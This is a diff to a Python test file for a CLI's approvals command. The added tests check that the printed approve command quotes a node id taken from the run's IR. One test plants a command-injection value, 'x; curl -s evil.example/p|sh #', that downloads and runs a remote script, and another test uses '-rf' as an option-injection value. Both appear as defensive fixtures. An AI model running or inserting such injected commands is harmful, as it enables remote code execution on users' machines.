@@ -217,7 +217,7 @@ def test_approvals_shows_the_full_digest_to_echo() -> None:
 
     assert result.exit_code == 0, result.output
     assert DIGEST in result.output
-    assert f"--action-digest {DIGEST}" in result.output.replace("\n", " ")
+    assert f"--action-digest={DIGEST}" in result.output
 
 
 def test_approvals_summarises_what_the_digest_covers() -> None:
@@ -258,7 +258,7 @@ def test_approvals_shows_the_calls_hash_of_a_dispatch_request() -> None:
         result = runner.invoke(app, ["approvals", "exec-1"])
 
     assert result.exit_code == 0, result.output
-    assert "--action-digest h-123" in result.output
+    assert "--action-digest=h-123" in result.output
     assert "calls: send_wire" in result.output
 
 
@@ -287,7 +287,7 @@ def test_approvals_names_the_calls_a_bound_dispatch_digest_covers() -> None:
         result = runner.invoke(app, ["approvals", "exec-1"])
 
     assert result.exit_code == 0, result.output
-    assert f"--action-digest {DIGEST}" in result.output
+    assert f"--action-digest={DIGEST}" in result.output
     assert "step 1; calls: send_wire({})" in result.output
 
 
@@ -319,6 +319,52 @@ def test_approvals_shows_the_handler_a_call_resolves_to() -> None:
 
     assert result.exit_code == 0, result.output
     assert "calls: lookup -> bank.wires:send_wire({})" in result.output
+
+
+def _approve_lines(output: str) -> list[str]:
+    return [line for line in output.splitlines() if line.lstrip().startswith("jamjet approve")]
+
+
+def test_the_printed_approve_command_is_safe_to_paste() -> None:
+    """A node id is chosen by whoever wrote the IR. Pasted into a shell, the
+    approve line must run `jamjet approve` with that id as one argument and
+    nothing else: no label before the command, every argument quoted."""
+    import shlex
+
+    evil = "x; curl -s evil.example/p|sh #"
+    pending = _bound_pending()
+    pending[0]["node_id"] = evil
+    fake = _approvals_client(pending, [])
+
+    with patch("jamjet.cli.main._client", return_value=fake):
+        result = runner.invoke(app, ["approvals", "exec-1"])
+
+    assert result.exit_code == 0, result.output
+    lines = _approve_lines(result.output)
+    assert len(lines) == 1, result.output
+    argv = shlex.split(lines[0])
+    assert argv == [
+        "jamjet",
+        "approve",
+        "exec-1",
+        "--decision",
+        "approved",
+        f"--node-id={evil}",
+        f"--action-digest={DIGEST}",
+    ], argv
+
+
+def test_a_dash_leading_node_id_is_not_read_as_an_option() -> None:
+    import shlex
+
+    pending = _bound_pending()
+    pending[0]["node_id"] = "-rf"
+    fake = _approvals_client(pending, [])
+
+    with patch("jamjet.cli.main._client", return_value=fake):
+        result = runner.invoke(app, ["approvals", "exec-1"])
+
+    assert "--node-id=-rf" in shlex.split(_approve_lines(result.output)[0])
 
 
 def test_approvals_escapes_control_characters_from_the_run() -> None:
@@ -472,3 +518,25 @@ def test_approve_passes_the_action_digest_option_through() -> None:
 
     assert result.exit_code == 0, result.output
     assert fake.approve.call_args.kwargs.get("action_digest") == "d-1"
+
+
+def test_the_printed_approve_command_round_trips() -> None:
+    """Split as a shell would, the printed line drives `jamjet approve` with
+    exactly the listed node id and digest."""
+    import shlex
+
+    pending = _bound_pending()
+    pending[0]["node_id"] = "-step.v2"
+    with patch("jamjet.cli.main._client", return_value=_approvals_client(pending, [])):
+        listing = runner.invoke(app, ["approvals", "exec-1"])
+    argv = shlex.split(_approve_lines(listing.output)[0])
+    assert argv[:2] == ["jamjet", "approve"]
+
+    fake = _approve_client({"execution_id": "exec-1", "node_id": "-step.v2", "accepted": True})
+    with patch("jamjet.cli.main._client", return_value=fake):
+        result = runner.invoke(app, argv[1:])
+
+    assert result.exit_code == 0, result.output
+    kwargs = fake.approve.call_args.kwargs
+    assert kwargs.get("node_id") == "-step.v2", fake.approve.call_args
+    assert kwargs.get("action_digest") == DIGEST
